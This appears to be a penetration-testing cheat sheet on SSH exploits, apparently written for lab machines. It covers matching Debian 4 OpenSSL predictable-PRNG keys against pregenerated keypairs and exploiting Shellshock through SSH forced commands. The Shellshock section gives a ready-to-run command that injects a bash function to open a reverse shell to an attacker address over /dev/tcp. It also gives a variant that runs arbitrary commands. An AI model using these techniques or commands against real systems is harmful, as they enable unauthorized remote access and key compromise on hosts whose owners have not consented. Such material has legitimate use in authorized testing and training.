## SSH Exploits

### Debian OpenSSL Predictable PRNG

Affects: RSA Keys generated on some Debian 4 systems

1. If an SSL cert was generated on Debian 4, it may be affected by this.

2. Get access to the public key (such as in authorized_keys), fingerprint the public key

   ```bash
   ssh-keygen -l -E md5 -f keyfile
   ```

3. See if this md5 hash matches one of the pre-generated keypairs found on this site:  https://github.com/g0tmi1k/debian-ssh.  1024/DSA and 2048/RSA keys are in ~/opt/tools/openssl-deb4-prng-keys

### Shellshock

In order to exploit shellshock using SSH, these must be true:

1. Obviously, a vulnerable bash shell
2. User must be authenticated using ‘authorization_keys’
3. User must be restricted to run some specific commands.

If these are true, connect with this command to get a reverse shell:

```bash
ssh user@10.10.10.10 '() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.29/8000 0>&1'

# Or execute other commands
ssh user@10.10.10.10 '() { :;}; some_cmd'
```

For more info on how to exploit it, see this page:  https://resources.infosecinstitute.com/practical-shellshock-exploitation-part-2/